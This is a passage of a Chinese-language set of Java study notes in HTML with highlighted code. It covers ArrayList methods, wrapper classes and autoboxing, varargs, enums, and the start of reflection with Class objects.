<span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> staff3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最好使用var关键字以避免重复写类名；如果没有使用var关键字，可以省去右边的类型参数。（菱形语法）</p><p>当然还可以把初始容量传递给<code>ArrayList构造器</code>：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><blockquote><p>数组列表的容量与数组的大小有一个非常重要的区别。如果分配一个有100个元素的数组，数组就有100个空位置可以使用。而容量为100个元素的数组列表只是<strong>可能</strong>保存100个元素。但是在最初，甚至完成初始化构造之后，数组列表不包含任何元素。</p></blockquote><p>使用<strong>add</strong>方法可以将元素添加到数组列表中。如果需要在数组列表的中间插入元素，可以使用add方法并提供一个索引参数。</p><p>要设置第i个元素，可以使用<code>set</code>。</p><p>要得到数组列表的元素，可以使用<code>get</code>。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//feng</span>staff<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"hhh"</span><span class="token punctuation">,</span><span class="token number">3456</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//hhh</span></code></pre><blockquote><p>只有当数组列表的大小大于i时，才能够调用<code>list.set(i,x)</code>。set方法只是用来替换数组中已经加入的元素。</p></blockquote><p>size方法将返回数组列表中包含的<strong>实际元素个数</strong>。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//1</span></code></pre><p><code>remove</code>方法可以从数组列表中间删除一个元素：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//1</span><span class="token class-name">Employee</span> e <span class="token operator">=</span> staff<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//feng</span></code></pre><p>可以使用<code>for each</code>循环遍历数组列表的内容：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng1"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng2"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng3"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>staff<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng4"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> e<span class="token operator">:</span>staff<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="对象包装器与自动装箱"><a href="#对象包装器与自动装箱" class="headerlink" title="对象包装器与自动装箱"></a>对象包装器与自动装箱</h3><p>所有的基本类型都有一个与之对应的类。这些类称为包装器。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">Long</span><span class="token punctuation">,</span><span class="token class-name">Float</span><span class="token punctuation">,</span><span class="token class-name">Double</span><span class="token punctuation">,</span><span class="token class-name">Short</span><span class="token punctuation">,</span><span class="token class-name">Byte</span><span class="token punctuation">,</span><span class="token class-name">Character</span><span class="token punctuation">,</span><span class="token class-name">Boolean</span> <span class="token punctuation">(</span>前六个类派生于公共的超类<span class="token class-name">Number</span><span class="token punctuation">)</span></code></pre><p>包装器类是不可变的，即一旦构造了包装器，就不允许更改包装在其中的值。同时，包装器类型还是<code>final</code>，因此不能派生它们的子类。</p><p>对于<code>ArrayList</code>，尖括号中的类型不允许是基本类型，因此要用到包装器类，例如<code>Integer</code>等。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integet</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>对于这种调用</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> list <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>将自动变成：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> list <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这种变换称为自动装箱。</p><p>相反的，把<code>Integet</code>赋给一个<code>int</code>时，会自动拆箱：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> n <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>装箱和拆箱是编译器要做的工作，而不是虚拟机。<strong>编译器</strong>在生成类的字节码时会插入必要的方法调用。<strong>虚拟机</strong>只是执行这些字节码。</p><h3 id="参数数量可变的方法"><a href="#参数数量可变的方法" class="headerlink" title="参数数量可变的方法"></a>参数数量可变的方法</h3><p>可以提供参数数量可变的方法（有时这些方法被称为”变参”(varargs)方法）。</p><p>这里的省略号<code>...</code>是Java代码的一部分，它表明这个方法可以接收任意数量的对象。例如：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printNumber</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token number">456</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printNumber</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> numbers<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">double</span> e<span class="token operator">:</span>numbers<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>允许将数组作为最后一个参数传递给可变参数的方法。</p><p>因此，如果一个已有方法的最后一个参数是数组，可以把它重新定义为有可变参数的方法，而不会破坏任何已有的代码。</p></blockquote><h3 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h3><p>定义枚举类型：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">Size</span> <span class="token punctuation">&#123;</span><span class="token constant">SMALL</span><span class="token punctuation">,</span><span class="token constant">MEDIUM</span><span class="token punctuation">,</span><span class="token constant">LARGE</span><span class="token punctuation">,</span><span class="token constant">EXTRA_LARGE</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>实际上，这个声明定义的类型是一个类，它刚好有四个实例，不可能构造新的对象。</p><p>因此，在比较两个枚举类型的值时，并不需要调用<code>equals</code>，直接使用<code>==</code>就可以了。</p><p>同样可以为枚举类型增加构造器、方法和字段。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">enum</span> <span class="token class-name">Size</span><span class="token punctuation">&#123;</span>    <span class="token function">SMALL</span><span class="token punctuation">(</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">MEDIUM</span><span class="token punctuation">(</span><span class="token string">"M"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">LARGE</span><span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">EXTRA_LARGE</span><span class="token punctuation">(</span><span class="token string">"XL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> abbreviation<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Size</span><span class="token punctuation">(</span><span class="token class-name">String</span> abbreviation<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>abbreviation <span class="token operator">=</span> abbreviation<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAbbreviation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>abbreviation<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>枚举的构造器总是私有的。</p><p>所有的枚举类型都是<code>Enum</code>类的子类。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//com.javalearn.Size</span></code></pre><p>它们继承了这个类的许多方法，其中最有用的一个是<code>toString</code>，这个方法返回枚举常量名：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//SMALL</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//java.lang.String</span></code></pre><p><code>toString</code>的逆方法是静态<code>valueOf</code>：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Enum</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"SMALL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//SMALL</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Enum</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"SMALL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//com.javalearn.Size</span></code></pre><p>每个枚举类型都有一个静态的<code>values</code>方法，它将返回一个包含全部枚举值的数组。</p><pre class="language-java" data-language="java"><code class="language-java">        <span class="token class-name">Size</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> <span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Size</span> e<span class="token operator">:</span>values<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token comment">/*SMALLMEDIUMLARGEEXTRA_LARGE*/</span></code></pre><p><code>ordinal</code>方法返回enum声明中枚举常量的位置，位置从0开始计数。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">ordinal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span></code></pre><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p><strong>（之后会再专门针对Java安全中反射的利用进行一下学习）</strong></p><p>反射库提供了一个丰富且精巧的工具集，可以用来编写能够动态操纵Java代码的程序。</p><p>能够分析类能力的程序称为<strong>反射</strong>。</p><p>反射机制可以用来：</p><ul><li>在运行时分析类的能力。</li><li>在运行时检查对象。</li><li>实现泛型数组操作代码。</li><li>利用Method对象，这个对象很像C++中的函数指针。</li></ul><h4 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h4><p>在程序运行期间，Java运行时系统始终为所有对象维护一个运行时类型标识。这个信息会跟踪每个对象所属的类。虚拟机利用运行时类型信息选择要执行的正确方法。</p><p>可以使用一个特殊的Java类访问这些信息。保存这些信息的类名为<code>Class</code>。</p><p><code>Object</code>类中的<code>getClass()</code>方法将会返回一个<code>Class</code>类型的实例。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//class com.javalearn.Employee</span></code></pre><p><code>Class</code>对象会描述一个特定类的属性。最常用的Class方法就是<code>getName</code>。这个方法将返回类的名字。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>如果类在一个包里，包的名字也作为类名的一部分。所以我这里会返回<code>com.javalearn.Employee</code></p><p>还可以使用静态方法<code>forName</code>获得类名对应的<code>Class</code>对象。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token string">"com.javalearn.Employee"</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>获得<code>Class</code>类对象的第三种方法是一个很方便的快捷方式。如果T是任意的Java类型（或void关键字），<code>T.class</code>将代表匹配的类对象。</p><blockquote><p><code>Class</code>类实际上是一个泛型类。</p></blockquote><p>虚拟机为每个类型管理一个唯一的<code>Class</code>对象。因此，可以利用<code>==</code>运算符实现两个类对象的比较。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Employee</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>如果有一个<code>Class</code>类型的对象，可以用它构造类的实例。调用<code>getConstructor</code>方法将得到一个<code>Constructor</code>类型的对象，然后使用<code>newInstance</code>方法来构造一个实例。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token string">"com.javalearn.Employee"</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> obj <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>但是这个类如果没有无参数的构造器，<code>getConstructor</code>方法会抛出异常。</p><h4 id="声明异常入门"><a href="#声明异常入门" class="headerlink" title="声明异常入门"></a>声明异常入门</h4><p>当运行时发生错误时，程序就会“抛出一个异常”。我们可以提供一个处理器“捕获”这个异常并进行处理。</p><p>异常有两种类型，非检查型异常和检查型异常。</p><p>如果一个方法包含一条可能抛出检查型异常的语句，则在方法名上增加一个<code>throws</code>子句：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ReflectiveOperationException</span> <span class="token punctuation">&#123;</span></code></pre><p>调用这个方法的任何方法也都需要一个<code>throws</code>声明。</p><h4 id="利用反射分析类的能力"><a href="#利用反射分析类的能力" class="headerlink" 